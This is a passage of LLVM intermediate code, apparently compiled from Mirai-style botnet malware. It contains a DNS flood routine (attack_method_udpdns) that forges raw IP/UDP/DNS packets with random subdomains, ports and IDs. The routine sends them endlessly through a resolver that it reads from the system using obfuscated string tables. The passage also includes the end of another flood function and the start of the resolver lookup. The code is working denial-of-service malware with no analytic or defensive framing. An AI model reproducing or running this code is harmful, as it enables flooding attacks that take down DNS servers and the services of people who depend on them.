  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  store %struct.sockaddr* %280, %struct.sockaddr** %274, align 8
  %281 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %282 = load %struct.sockaddr*, %struct.sockaddr** %281, align 8
  %283 = call i64 @sendto(i32 noundef %269, i8* noundef %270, i64 noundef %273, i32 noundef 16384, %struct.sockaddr* %282, i32 noundef 16)
  br label %284

284:                                              ; preds = %237
  %285 = load i32, i32* %9, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %9, align 4
  br label %165, !llvm.loop !30

287:                                              ; preds = %165
  br label %164

288:                                              ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpdns(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 noundef %39, i64 noundef 8) #7
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 noundef zeroext %42, %struct.attack_option* noundef %43, i8 noundef zeroext 2, i32 noundef 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 noundef zeroext %46, %struct.attack_option* noundef %47, i8 noundef zeroext 3, i32 noundef 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 noundef zeroext %50, %struct.attack_option* noundef %51, i8 noundef zeroext 4, i32 noundef 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 noundef zeroext %54, %struct.attack_option* noundef %55, i8 noundef zeroext 5, i32 noundef 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 noundef zeroext %58, %struct.attack_option* noundef %59, i8 noundef zeroext 6, i32 noundef 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 noundef zeroext %62, %struct.attack_option* noundef %63, i8 noundef zeroext 7, i32 noundef 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 noundef zeroext %66, %struct.attack_option* noundef %67, i8 noundef zeroext 9, i32 noundef 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 noundef zeroext %70, %struct.attack_option* noundef %71, i8 noundef zeroext 0, i32 noundef 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 noundef zeroext %74, %struct.attack_option* noundef %75, i8 noundef zeroext 8, i8* noundef null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

80:                                               ; preds = %4
  br label %396

81:                                               ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* noundef %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %81
  br label %396

87:                                               ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 noundef %88, i32 noundef 0, i32 noundef 3, i8* noundef %89, i32 noundef 4) #7
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 noundef %93)
  br label %396

95:                                               ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

96:                                               ; preds = %257, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %260

101:                                              ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 noundef 600, i64 noundef 1) #7
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %12, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i8, i8* %19, align 1
  %136 = zext i8 %135 to i64
  %137 = add i64 41, %136
  %138 = add i64 %137, 2
  %139 = load i32, i32* %21, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 %138, %140
  %142 = add i64 %141, 4
  %143 = trunc i64 %142 to i16
  %144 = call zeroext i16 @htons(i16 noundef zeroext %143) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 noundef zeroext %147) #8
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

156:                                              ; preds = %101
  %157 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %158 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

160:                                              ; preds = %156, %101
  %161 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 17, i8* %162, align 1
  %163 = load i32, i32* @LOCAL_ADDR, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load i32, i32* %22, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load i16, i16* %16, align 2
  %170 = call zeroext i16 @htons(i16 noundef zeroext %169) #8
  %171 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %17, align 2
  %174 = call zeroext i16 @htons(i16 noundef zeroext %173) #8
  %175 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 1
  store i16 %174, i16* %176, align 2
  %177 = load i8, i8* %19, align 1
  %178 = zext i8 %177 to i64
  %179 = add i64 21, %178
  %180 = add i64 %179, 2
  %181 = load i32, i32* %21, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 %180, %182
  %184 = add i64 %183, 4
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 noundef zeroext %185) #8
  %187 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %18, align 2
  %190 = call zeroext i16 @htons(i16 noundef zeroext %189) #8
  %191 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %192 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %191, i32 0, i32 0
  store i16 %190, i16* %192, align 2
  %193 = call zeroext i16 @htons(i16 noundef zeroext 256) #8
  %194 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %195 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %197 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %198 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i8, i8* %19, align 1
  %200 = load i8*, i8** %29, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %29, align 8
  store i8 %199, i8* %200, align 1
  %202 = load i8, i8* %19, align 1
  %203 = zext i8 %202 to i32
  %204 = load i8*, i8** %29, align 8
  %205 = sext i32 %203 to i64
  %206 = getelementptr inbounds i8, i8* %204, i64 %205
  store i8* %206, i8** %29, align 8
  %207 = load i8*, i8** %29, align 8
  store i8* %207, i8** %30, align 8
  %208 = load i8*, i8** %29, align 8
  %209 = getelementptr inbounds i8, i8* %208, i64 1
  %210 = load i8*, i8** %20, align 8
  %211 = load i32, i32* %21, align 4
  %212 = add nsw i32 %211, 1
  call void @util_memcpy(i8* noundef %209, i8* noundef %210, i32 noundef %212)
  store i32 0, i32* %23, align 4
  br label %213

213:                                              ; preds = %239, %160
  %214 = load i32, i32* %23, align 4
  %215 = load i32, i32* %21, align 4
  %216 = icmp slt i32 %214, %215
  br i1 %216, label %217, label %242

217:                                              ; preds = %213
  %218 = load i8*, i8** %20, align 8
  %219 = load i32, i32* %23, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = load i8, i8* %221, align 1
  %223 = sext i8 %222 to i32
  %224 = icmp eq i32 %223, 46
  br i1 %224, label %225, label %235

225:                                              ; preds = %217
  %226 = load i8, i8* %24, align 1
  %227 = load i8*, i8** %30, align 8
  store i8 %226, i8* %227, align 1
  store i8 0, i8* %24, align 1
  %228 = load i8, i8* %25, align 1
  %229 = add i8 %228, 1
  store i8 %229, i8* %25, align 1
  %230 = load i8*, i8** %29, align 8
  %231 = load i32, i32* %23, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds i8, i8* %230, i64 %232
  %234 = getelementptr inbounds i8, i8* %233, i64 1
  store i8* %234, i8** %30, align 8
  br label %238

235:                                              ; preds = %217
  %236 = load i8, i8* %24, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %24, align 1
  br label %238

238:                                              ; preds = %235, %225
  br label %239

239:                                              ; preds = %238
  %240 = load i32, i32* %23, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %23, align 4
  br label %213, !llvm.loop !31

242:                                              ; preds = %213
  %243 = load i8, i8* %24, align 1
  %244 = load i8*, i8** %30, align 8
  store i8 %243, i8* %244, align 1
  %245 = load i8*, i8** %29, align 8
  %246 = load i32, i32* %21, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  %249 = getelementptr inbounds i8, i8* %248, i64 2
  %250 = bitcast i8* %249 to %struct.grehdr*
  store %struct.grehdr* %250, %struct.grehdr** %31, align 8
  %251 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %252 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %253 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %252, i32 0, i32 0
  store i16 %251, i16* %253, align 2
  %254 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %255 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %256 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %255, i32 0, i32 1
  store i16 %254, i16* %256, align 2
  br label %257

257:                                              ; preds = %242
  %258 = load i32, i32* %9, align 4
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %9, align 4
  br label %96, !llvm.loop !32

260:                                              ; preds = %96
  br label %261

261:                                              ; preds = %395, %260
  store i32 0, i32* %9, align 4
  br label %262

262:                                              ; preds = %392, %261
  %263 = load i32, i32* %9, align 4
  %264 = load i8, i8* %5, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp slt i32 %263, %265
  br i1 %266, label %267, label %395

267:                                              ; preds = %262
  %268 = load i8**, i8*** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i8*, i8** %268, i64 %270
  %272 = load i8*, i8** %271, align 8
  store i8* %272, i8** %32, align 8
  %273 = load i8*, i8** %32, align 8
  %274 = bitcast i8* %273 to %struct.iphdr*
  store %struct.iphdr* %274, %struct.iphdr** %33, align 8
  %275 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i64 1
  %277 = bitcast %struct.iphdr* %276 to %struct.udphdr*
  store %struct.udphdr* %277, %struct.udphdr** %34, align 8
  %278 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i64 1
  %280 = bitcast %struct.udphdr* %279 to %struct.dnshdr*
  store %struct.dnshdr* %280, %struct.dnshdr** %35, align 8
  %281 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %282 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %281, i64 1
  %283 = bitcast %struct.dnshdr* %282 to i8*
  %284 = getelementptr inbounds i8, i8* %283, i64 1
  store i8* %284, i8** %36, align 8
  %285 = load i16, i16* %13, align 2
  %286 = zext i16 %285 to i32
  %287 = icmp eq i32 %286, 65535
  br i1 %287, label %288, label %294

288:                                              ; preds = %267
  %289 = call i32 @rand_next()
  %290 = and i32 %289, 65535
  %291 = trunc i32 %290 to i16
  %292 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 3
  store i16 %291, i16* %293, align 4
  br label %294

294:                                              ; preds = %288, %267
  %295 = load i16, i16* %16, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 65535
  br i1 %297, label %298, label %304

298:                                              ; preds = %294
  %299 = call i32 @rand_next()
  %300 = and i32 %299, 65535
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 0
  store i16 %301, i16* %303, align 2
  br label %304

304:                                              ; preds = %298, %294
  %305 = load i16, i16* %17, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %314

308:                                              ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 1
  store i16 %311, i16* %313, align 2
  br label %314

314:                                              ; preds = %308, %304
  %315 = load i16, i16* %18, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  br i1 %317, label %318, label %324

318:                                              ; preds = %314
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %323 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

324:                                              ; preds = %318, %314
  %325 = load i8*, i8** %36, align 8
  %326 = load i8, i8* %19, align 1
  %327 = zext i8 %326 to i32
  call void @rand_alpha_str(i8* noundef %325, i32 noundef %327)
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 0, i16* %329, align 2
  %330 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %331 = bitcast %struct.iphdr* %330 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* noundef %331, i32 noundef 20)
  %333 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 7
  store i16 %332, i16* %334, align 2
  %335 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %336 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %335, i32 0, i32 3
  store i16 0, i16* %336, align 2
  %337 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %339 = bitcast %struct.udphdr* %338 to i8*
  %340 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 2
  %342 = load i16, i16* %341, align 2
  %343 = load i8, i8* %19, align 1
  %344 = zext i8 %343 to i64
  %345 = add i64 21, %344
  %346 = add i64 %345, 2
  %347 = load i32, i32* %21, align 4
  %348 = sext i32 %347 to i64
  %349 = add i64 %346, %348
  %350 = add i64 %349, 4
  %351 = trunc i64 %350 to i32
  %352 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %337, i8* noundef %339, i16 noundef zeroext %342, i32 noundef %351)
  %353 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 3
  store i16 %352, i16* %354, align 2
  %355 = load i32, i32* %22, align 4
  %356 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 0
  %361 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 2
  %362 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %361, i32 0, i32 0
  store i32 %355, i32* %362, align 4
  %363 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 1
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 0
  %371 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %370, i32 0, i32 1
  store i16 %365, i16* %371, align 2
  %372 = load i32, i32* %10, align 4
  %373 = load i8*, i8** %32, align 8
  %374 = load i8, i8* %19, align 1
  %375 = zext i8 %374 to i64
  %376 = add i64 41, %375
  %377 = add i64 %376, 2
  %378 = load i32, i32* %21, align 4
  %379 = sext i32 %378 to i64
  %380 = add i64 %377, %379
  %381 = add i64 %380, 4
  %382 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %383 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i32 0, i32 0
  %388 = bitcast %struct.sockaddr_in* %387 to %struct.sockaddr*
  store %struct.sockaddr* %388, %struct.sockaddr** %382, align 8
  %389 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %390 = load %struct.sockaddr*, %struct.sockaddr** %389, align 8
  %391 = call i64 @sendto(i32 noundef %372, i8* noundef %373, i64 noundef %381, i32 noundef 16384, %struct.sockaddr* %390, i32 noundef 16)
  br label %392

392:                                              ; preds = %324
  %393 = load i32, i32* %9, align 4
  %394 = add nsw i32 %393, 1
  store i32 %394, i32* %9, align 4
  br label %262, !llvm.loop !33

395:                                              ; preds = %262
  br label %261

396:                                              ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 noundef zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 noundef 21, i32* noundef null)
  %12 = call i32 (i8*, i32, ...) @open(i8* noundef %11, i32 noundef 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 noundef zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

15:                                               ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %18 = call i64 @read(i32 noundef %16, i8* noundef %17, i64 noundef 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 noundef %20)
  call void @table_unlock_val(i8 noundef zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 noundef 22, i32* noundef null)
  %25 = call i32 @util_stristr(i8* noundef %22, i32 noundef %23, i8* noundef %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 noundef zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

28:                                               ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

30:                                               ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

34:                                               ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

41:                                               ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

45:                                               ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

49:                                               ; preds = %45, %41
  br label %84

50:                                               ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

51:                                               ; preds = %50
  br label %52

52:                                               ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

56:                                               ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

60:                                               ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

64:                                               ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

69:                                               ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* noundef %70, i8* noundef %74, i32 noundef %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

83:                                               ; preds = %64
  br label %84

84:                                               ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30, !llvm.loop !34

87:                                               ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %87
